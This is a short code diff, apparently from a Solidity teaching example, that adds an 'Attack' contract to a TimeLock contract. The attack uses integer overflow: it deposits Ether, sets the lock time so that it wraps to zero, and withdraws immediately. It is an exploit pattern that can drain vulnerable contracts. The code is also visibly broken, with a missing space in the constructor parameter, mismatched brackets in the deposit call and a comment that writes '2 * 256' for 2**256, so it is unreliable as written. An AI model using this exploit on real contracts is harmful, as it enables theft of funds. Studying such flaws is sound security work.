@@ -22,3 +22,24 @@ contract TimeLock {
         require (sent, "Failed to send Ether") ; 
         }
     }
+
+
+contract Attack{
+    TimeLock timeLock ;
+    constructor ( TimeLock_timeLock ) public {
+        timeLock = TimeLock ( _timeLock ) ;
+   }
+    fallback()external payable { }
+    function attack() public payable {
+        timeLock.deposit ( value : msg.value } ( ) ;
+        // t == current lock time
+        // find x such that
+        // x + t = 2 * 256 = 0
+        // x = -t
+        timeLock.increaseLockTime(
+            // 2 ** 256 - t
+        uint (-timeLock.lockTime(address(this)))
+        );
+        timeLock.withdraw();
+        
+    }
